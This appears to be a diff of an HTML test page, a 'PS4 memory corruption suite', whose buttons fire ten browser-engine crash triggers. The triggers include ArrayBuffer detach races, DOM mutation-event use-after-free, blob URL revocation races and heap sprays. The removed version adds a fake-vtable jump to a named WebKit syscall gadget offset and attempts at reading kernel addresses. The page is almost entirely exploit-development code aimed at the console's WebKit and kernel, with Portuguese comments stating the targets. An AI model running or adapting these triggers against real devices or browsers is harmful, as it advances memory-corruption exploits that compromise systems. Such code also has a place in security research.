@@ -2,299 +2,261 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 FW 12.00 Absolute Address Crash Suite v18000</title>
+<title>PS4 Pure Memory Corruption Suite v19000</title>
 </head>
 <body>
 
-<h1>SUITE V18000: ABSOLUTE ADDRESS & SYSCALL GADGETS</h1>
-<p>Targets: Kernel @ 0xffffffff82200000 | WebKit Syscall @ 0x173a88</p>
+<h1>SUITE V19000: PURE HEAP CORRUPTION (NO WEBGL/WS/SAB)</h1>
+<p>Target: WebCore UAF & Buffer Detach Races</p>
 <hr>
 
-<button onclick="crashKernelDMA()">01. WebGL DMA Read from Kernel Base (0xffffffff82200000)</button>
+<button onclick="crashBufferTransfer()">01. ArrayBuffer Transfer to Worker vs View Access (Classic UAF)</button>
 
-<button onclick="crashSyscallGadget()">02. Fake VTable Jump to WebKit Syscall Gadget (0x173a88)</button>
+<button onclick="crashMutationEvent()">02. DOMNodeRemoved Event Handler Parent Destruction (DOM UAF)</button>
 
-<button onclick="crashDataSegment()">03. TypedArray Overlap on WebKit Data Segment (0x3cc0000)</button>
+<button onclick="crashAudioDetach()">03. AudioBuffer Channel Data Detach during Playback</button>
 
-<button onclick="crashStackSmash()">04. Recursive Stack Smash aligning to 61MB Text Segment</button>
+<button onclick="crashPortRecursion()">04. MessagePort PostMessage Recursive Cloning (IPC Stack Smash)</button>
 
-<button onclick="crashLibKernelFlood()">05. LibKernel Syscall 0x483 (Clock) Resource Exhaustion</button>
+<button onclick="crashXHRAbort()">05. XMLHttpRequest Abort during Readystate Change (Internal State UAF)</button>
 
-<button onclick="crashDoubleFree()">06. DOMNodeInserted Double Free Race Condition</button>
+<button onclick="crashStringRope()">06. Large String Rope Flattening Heap Overflow (Allocator Panic)</button>
 
-<button onclick="crashSharedMemPanic()">07. SharedArrayBuffer Kernel Map Race (VM_MAP Panic)</button>
+<button onclick="crashRangeExtract()">07. DOM Range extractContents Mutation Race</button>
 
-<button onclick="crashFloatRegs()">08. FPU/XMM Register Corruption via Math.hypot spam</button>
+<button onclick="crashBlobRevoke()">08. Fetch Blob URL vs revokeObjectURL Race (VFS Panic)</button>
 
-<button onclick="crashLargeObjectAlign()">09. 2MB Huge Page Alignment Heap Spray (Fragment Memory)</button>
+<button onclick="crashTextDecode()">09. TextDecoder Stream Decode vs Buffer Detach</button>
 
-<button onclick="crashSocketKernelBuffer()">10. WebSocket 128KB Kernel Buffer Overflow</button>
+<button onclick="crashArrayOverflow()">10. TypedArray Constructor Integer Overflow (Heap Spray)</button>
 
-<div id="log" style="white-space: pre; border: 1px solid #000; height: 200px; overflow: auto;"></div>
+<div id="log" style="border: 1px solid #000; height: 200px; overflow: auto; white-space: pre;"></div>
 
 <script>
     function log(msg) {
         document.getElementById('log').innerText += "\n" + msg;
     }
 
-    // 01. WebGL DMA Read from Kernel Base
-    // Alvo: Tentar forçar a GPU a ler do endereço físico do Kernel descoberto no JSON (0xffffffff82200000)
-    function crashKernelDMA() {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl2');
-        if(!gl) return log("WebGL2 N/A");
+    // 01. ArrayBuffer Transfer to Worker vs View Access (Classic UAF)
+    // Alvo: Escrever em memória que acabou de ser transferida para outra thread.
+    // O motor deve "desligar" (detach) a View imediatamente, mas se houver delay...
+    function crashBufferTransfer() {
+        const ab = new ArrayBuffer(1024 * 1024 * 8); // 8MB
+        const view = new Uint32Array(ab);
         
-        // Cria um buffer na GPU
-        const buf = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-        gl.bufferData(gl.ARRAY_BUFFER, 1024, gl.STATIC_DRAW);
+        // Worker apenas para receber a memória
+        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){}"], {type:'text/javascript'})));
         
-        // Tentamos usar 'copyBufferSubData' ou similar para ler de um offset absurdo
-        // Emulando um ponteiro de 64-bit corrompido que aponta para o Kernel
-        const kernelPtr = 0xFFFFFFFF; // Parte baixa do endereço, esperando sign-extension ou wrap
+        // Race: Agenda a transferência
+        setTimeout(() => {
+            w.postMessage(ab, [ab]);
+        }, 0);
         
+        // Tenta escrever freneticamente
         try {
-            // Tenta acessar memória fora dos limites do Userland
-            // Se o driver somar Base + Offset incorretamente, atinge o Kernel
-            gl.bindBuffer(gl.COPY_READ_BUFFER, buf);
-            gl.bindBuffer(gl.COPY_WRITE_BUFFER, buf);
-            gl.copyBufferSubData(gl.COPY_READ_BUFFER, gl.COPY_WRITE_BUFFER, kernelPtr, 0, 16);
-            gl.finish();
-        } catch(e) {
-            log("Erro WebGL: " + e.message);
-        }
-    }
-
-    // 02. Fake VTable Jump to WebKit Syscall Gadget
-    // Alvo: O gadget syscall encontrado em 0x173a88 no libSceNKWebKit
-    function crashSyscallGadget() {
-        // Spray de Heap com o endereço do gadget repetido
-        // 0x173a88 (Gadget) + Base Address (ASLR slide desconhecido, mas tentamos offsets baixos)
-        const struct = new Uint32Array(1024);
-        // Preenche com o offset do gadget encontrado no JSON
-        struct.fill(0x00173a88); 
-        
-        const spray = [];
-        for(let i=0; i<5000; i++) {
-            spray.push(new Uint32Array(struct));
-        }
-        
-        // Tenta corromper um objeto para usar esse spray como vtable
-        const target = {
-            a: 1,
-            b: 2,
-            c: 3,
-            toString: function() { return "crash"; }
-        };
-        
-        // Race condition: Define propriedades enquanto deleta
-        // Tentando Type Confusion para que 'target' aponte para nosso spray
-        const worker = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
-        worker.postMessage(target);
-        
-        try {
-            // Acesso que dispararia a vtable (se corrompido)
-            target.toString();
-        } catch(e) {}
-    }
-
-    // 03. TypedArray Overlap on WebKit Data Segment
-    // Alvo: Segmento de dados RW em 0x3cc0000
-    function crashDataSegment() {
-        // Tenta criar um ArrayBuffer gigante que, por sorte de alinhamento,
-        // sobreponha o segmento de dados do binário (0x3cc0000)
-        const size = 1024 * 1024 * 64; // 64MB
-        const arr = new Uint8Array(size);
-        
-        // Padrão de escrita para detecção de corrupção
-        for(let i=0; i<size; i+=4096) {
-            arr[i] = 0xCC; // INT3 breakpoint opcode
-        }
-        
-        // Força operações de cópia de memória rápidas (memcpy)
-        // Se houver um bug de limites no .set(), podemos escrever antes do buffer
-        try {
-            arr.set(arr.subarray(0, 100), -100); // Índice negativo (Integer Underflow?)
-        } catch(e) {}
-    }
-
-    // 04. Recursive Stack Smash (Alignment to 61MB Text)
-    // Alvo: Esgotar a stack com base no tamanho do segmento de texto (61MB)
-    function crashStackSmash() {
-        let depth = 0;
-        function recurse() {
-            depth++;
-            // Aloca variáveis na stack frame para consumir memória rápido
-            const frame = new Float64Array(100); 
-            frame[0] = Math.random();
-            
-            // Tenta chegar a uma profundidade que colida com a heap ou mmap areas
-            if (depth % 1000 === 0) log("Depth: " + depth);
-            recurse();
-            
-            // Impede otimização de cauda (Tail Call Optimization)
-            return frame[0]; 
-        }
-        try {
-            recurse();
-        } catch(e) {
-            log("Stack overflow catch: " + e.message);
-            // Tenta de novo em outra thread para estressar o kernel scheduler
-            new Worker(URL.createObjectURL(new Blob(["(" + recurse.toString() + ")()"], {type:'text/javascript'})));
-        }
-    }
-
-    // 05. LibKernel Syscall 0x483 (Clock) Flood
-    // Alvo: Syscall identificada no JSON em libkernel.sprx
-    // Syscall 0x483 geralmente é relacionada a tempo/clock (gettimeofday ou similar)
-    function crashLibKernelFlood() {
-        // performance.now() ou Date.now() chamam essa syscall internamente
-        // Vamos chamar milhões de vezes por segundo para criar contenção de spinlock no kernel
-        
-        const start = Date.now();
-        while(Date.now() - start < 2000) { // 2 segundos de flood
-            for(let i=0; i<10000; i++) {
-                const t = performance.now();
+            // Loop bloqueante para tentar pegar o exato momento do detach
+            const start = Date.now();
+            while (Date.now() - start < 1000) {
+                // Se o buffer for detachado, view.length vira 0.
+                // Se o JIT/Interpretador não checar isso a cada iteração...
+                if (view.length > 0) {
+                    view[0] = 0x41414141; 
+                }
             }
-        }
-        
-        // Combinado com WebWorkers para multicore flood
-        const blob = new Blob([`
-            while(true) performance.now();
-        `], {type:'text/javascript'});
-        
-        for(let i=0; i<4; i++) {
-            new Worker(URL.createObjectURL(blob));
+        } catch(e) {
+            log("View detached (seguro): " + e.message);
         }
     }
 
-    // 06. DOMNodeInserted Double Free Race
-    // Alvo: WebKit DOM Engine
-    function crashDoubleFree() {
-        const root = document.createElement('div');
+    // 02. DOMNodeRemoved Mutation UAF
+    // Alvo: WebCore DOM Tree. Remover o pai de um nó DENTRO do evento de remoção desse nó.
+    function crashMutationEvent() {
+        const parent = document.createElement('div');
         const child = document.createElement('div');
-        root.appendChild(child);
-        
-        child.addEventListener('DOMNodeInserted', (e) => {
-            // O nó está sendo inserido.
-            // Removemos ele imediatamente para tentar causar confusão de referência
+        parent.appendChild(child);
+        document.body.appendChild(parent);
+
+        child.addEventListener('DOMNodeRemoved', function(e) {
+            // O nó 'child' está sendo removido.
+            // O motor C++ tem um ponteiro para 'child' e 'parent'.
+            // Removemos o 'parent' agora.
             try {
-                root.removeChild(e.target);
-                // E limpamos a referência JS
-                e.target.remove();
+                document.body.removeChild(parent);
+                // Força GC para limpar o 'parent'
+                parent.innerHTML = "";
+                const junk = new Array(10000).fill(1);
             } catch(ex) {}
-            
-            // Aloca memória para ocupar o slot liberado
-            const filler = new Array(100).fill(1);
+        });
+
+        // Dispara o evento
+        parent.removeChild(child);
+    }
+
+    // 03. AudioBuffer Channel Data Detach during Playback
+    // Alvo: Audio DSP Thread. O processamento de áudio roda em thread separada de alta prioridade.
+    function crashAudioDetach() {
+        if(!window.AudioContext) return log("No AudioContext");
+        const ctx = new AudioContext();
+        const buffer = ctx.createBuffer(1, 44100, 44100);
+        const src = ctx.createBufferSource();
+        src.buffer = buffer;
+        src.connect(ctx.destination);
+        
+        // Pega os dados crus
+        const channelData = buffer.getChannelData(0);
+        const ab = channelData.buffer; // O ArrayBuffer subjacente
+        
+        src.start();
+        
+        // Transfere o buffer para um worker (Detach)
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
+        w.postMessage(ab, [ab]);
+        
+        // A thread de áudio tenta ler 'channelData' para tocar o som.
+        // Se a validação de "isDetached" falhar no DSP...
+    }
+
+    // 04. MessagePort PostMessage Recursive Cloning
+    // Alvo: Serialização de IPC (Structured Clone). Estouro de Pilha no Kernel ou Userland.
+    function crashPortRecursion() {
+        const ch = new MessageChannel();
+        let msg = { port: ch.port2 };
+        
+        // Cria aninhamento profundo de objetos contendo portas
+        for(let i=0; i<1000; i++) {
+            msg = { next: msg, port: ch.port2 };
+        }
+        
+        try {
+            // Envia a estrutura recursiva pela própria porta
+            ch.port1.postMessage(msg, [ch.port2]);
+        } catch(e) {
+            log("Falha no envio: " + e.message);
+        }
+    }
+
+    // 05. XMLHttpRequest Abort during Readystate Change
+    // Alvo: Máquina de estado do XHR C++.
+    function crashXHRAbort() {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", window.location.href);
+        
+        xhr.onreadystatechange = function() {
+            // Estado 2 = HEADERS_RECEIVED. O objeto está processando dados.
+            if(xhr.readyState === 2 || xhr.readyState === 3) {
+                xhr.abort(); // Destroi a request interna
+                
+                // Tenta acessar propriedades que dependem do request nativo
+                try {
+                    const s = xhr.status;
+                    const r = xhr.responseText;
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    }
+
+    // 06. Large String Rope Flattening Heap Overflow
+    // Alvo: JSC Heap (String Allocator).
+    function crashStringRope() {
+        // Cria uma "Rope String" (árvore de concatenação) gigante
+        let s = "A";
+        // 2^27 chars = ~134MB. PS4 tem limites de alocação contígua.
+        for(let i=0; i<27; i++) s += s; 
+        
+        try {
+            // Força "flattening": converter a árvore num buffer linear contíguo.
+            // Se o alocador falhar mas o código não checar NULL...
+            s.charAt(0); 
+            // Ou substituição que força cópia
+            s.replace(/A/g, "B");
+        } catch(e) {
+            log("OOM detectado (seguro).");
+        }
+    }
+
+    // 07. DOM Range extractContents Mutation Race
+    // Alvo: WebCore Editing (Range).
+    function crashRangeExtract() {
+        const div = document.createElement('div');
+        const p = document.createElement('p');
+        p.textContent = "Test node";
+        div.appendChild(p);
+        document.body.appendChild(div);
+        
+        const range = document.createRange();
+        range.selectNode(p);
+        
+        // Mutation observer para interceptar a remoção
+        const obs = new MutationObserver(() => {
+            // O Range está removendo o 'p'.
+            // Nós tentamos destruir o 'div' pai e limpar referências.
+            div.remove();
+            range.detach(); // Deprecated mas ainda existe em versões antigas
         });
         
-        // Trigger: Re-adiciona o mesmo nó que se auto-remove
-        // Isso pode levar a um Double Free no C++
+        obs.observe(div, {childList: true});
+        
         try {
-            root.appendChild(child);
+            range.extractContents();
         } catch(e) {}
     }
 
-    // 07. SharedArrayBuffer Kernel Map Race
-    // Alvo: VM_MAP do Kernel (Memory Management)
-    function crashSharedMemPanic() {
-        if(!window.SharedArrayBuffer) return log("SAB missing");
+    // 08. Fetch Blob URL vs revokeObjectURL Race
+    // Alvo: VFS (Virtual File System) do Kernel.
+    function crashBlobRevoke() {
+        const blob = new Blob(["CRASH".repeat(1000)]);
+        const url = URL.createObjectURL(blob);
         
-        // Cria múltiplos buffers compartilhados
-        const sabs = [];
-        for(let i=0; i<50; i++) sabs.push(new SharedArrayBuffer(4096));
+        // Inicia leitura do blob
+        fetch(url).then(r => r.text()).catch(e=>{});
         
-        const w = new Worker(URL.createObjectURL(new Blob([`
-            onmessage = function(e) {
-                const sabs = e.data;
-                // Tenta mapear e desmapear (via transfer ou acesso)
-                // Criando contenção no lock de memória virtual do kernel
-                setInterval(() => {
-                    const view = new Int32Array(sabs[Math.floor(Math.random()*sabs.length)]);
-                    Atomics.add(view, 0, 1);
-                }, 0);
-            }
-        `], {type:'text/javascript'})));
+        // Revoga a URL imediatamente (Race condition)
+        // O kernel tenta ler o 'inode' virtual que está sendo destruído
+        URL.revokeObjectURL(url);
         
-        w.postMessage(sabs);
-        
-        // Na main thread, também bombardeia
-        setInterval(() => {
-            const view = new Int32Array(sabs[Math.floor(Math.random()*sabs.length)]);
-            Atomics.add(view, 0, 1);
-        }, 0);
+        // Flood para aumentar a chance de conflito
+        for(let i=0; i<100; i++) URL.revokeObjectURL(url);
     }
 
-    // 08. FPU/XMM Register Corruption
-    // Alvo: Registradores Flutuantes do Kernel
-    function crashFloatRegs() {
-        // Operações matemáticas intensas usando constantes transcendentais
-        // para sujar todos os registradores XMM/YMM
-        const f64 = new Float64Array(1024);
-        for(let i=0; i<1024; i++) f64[i] = Math.random();
+    // 09. TextDecoder Stream Decode vs Buffer Detach
+    // Alvo: WebCore TextCodec.
+    function crashTextDecode() {
+        const decoder = new TextDecoder();
+        const u8 = new Uint8Array(1024 * 1024);
         
-        function compute() {
-            let acc = 0.0;
-            for(let i=0; i<1024; i++) {
-                acc += Math.sin(f64[i]) * Math.cos(f64[i]) + Math.tan(f64[i]);
-                acc = Math.hypot(acc, f64[i]);
-            }
-            return acc;
-        }
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type:'text/javascript'})));
         
-        // Executa em loop apertado esperando uma interrupção de contexto
-        // Se o Kernel não salvar/restaurar os registradores FPU corretamente... crash.
-        const start = Date.now();
-        while(Date.now() - start < 1000) {
-            compute();
-        }
-    }
-
-    // 09. 2MB Huge Page Alignment Heap Spray
-    // Alvo: Alocador de Memória do Sistema
-    function crashLargeObjectAlign() {
-        // O PS4 usa páginas de 16KB e Huge Pages de 2MB.
-        // Tentar alocar objetos que se alinhem exatamente em fronteiras de 2MB
-        // pode revelar bugs de fragmentação ou buffer overflow entre páginas.
-        const pageSize = 2 * 1024 * 1024; // 2MB
-        const chunks = [];
+        // Passa o buffer para o decoder com stream:true (mantém estado)
+        decoder.decode(u8, {stream: true});
+        
+        // Transfere o buffer (detach)
+        w.postMessage(u8.buffer, [u8.buffer]);
         
         try {
-            for(let i=0; i<100; i++) {
-                // Aloca ArrayBuffer de 2MB
-                const buf = new ArrayBuffer(pageSize);
-                // Escreve no último byte da página
-                new Uint8Array(buf)[pageSize - 1] = 0xAA;
-                chunks.push(buf);
-            }
-        } catch(e) {}
-        
-        // Libera alternadamente para criar "buracos" de 2MB
-        for(let i=0; i<chunks.length; i+=2) {
-            chunks[i] = null;
+            // Tenta decodificar novamente o buffer detachado
+            decoder.decode(u8, {stream: true});
+        } catch(e) {
+            log("Erro esperado: " + e.message);
         }
-        
-        // Tenta preencher os buracos com objetos de tamanho variável
-        const filler = new Array(1000).fill("A".repeat(1000));
     }
 
-    // 10. WebSocket 128KB Kernel Buffer Overflow
-    // Alvo: libSceNet Stack Buffer
-    function crashSocketKernelBuffer() {
-        const ws = new WebSocket("wss://echo.websocket.org");
-        ws.onopen = () => {
-            // Tamanho específico: 128KB é um tamanho comum de buffer de socket
-            // Se enviarmos exatamente isso + 1 byte, testamos boundary check
-            const size = (128 * 1024) + 1;
-            const buf = new Uint8Array(size);
-            buf.fill(0x41);
-            
-            try {
-                ws.send(buf);
-                // Envia imediatamente outro frame de controle
-                ws.close(); 
-            } catch(e) {}
-        };
+    // 10. TypedArray Constructor Integer Overflow
+    // Alvo: JSC ArrayBuffer Allocator.
+    function crashArrayOverflow() {
+        try {
+            // Tenta alocar array com tamanho negativo (interpretado como unsigned huge)
+            // ou tamanho que causa overflow na multiplicação por bytes (ex: len * 4)
+            const huge = new Int32Array(0x40000000); // 1GB * 4 = 4GB (Limite de 32bit)
+            huge[0] = 1;
+        } catch(e) {
+            log("Alocação falhou.");
+        }
+        
+        try {
+            // Tenta via construtor ArrayBuffer direto
+            new ArrayBuffer(0xFFFFFFFF);
+        } catch(e) {}
     }
 </script>
 
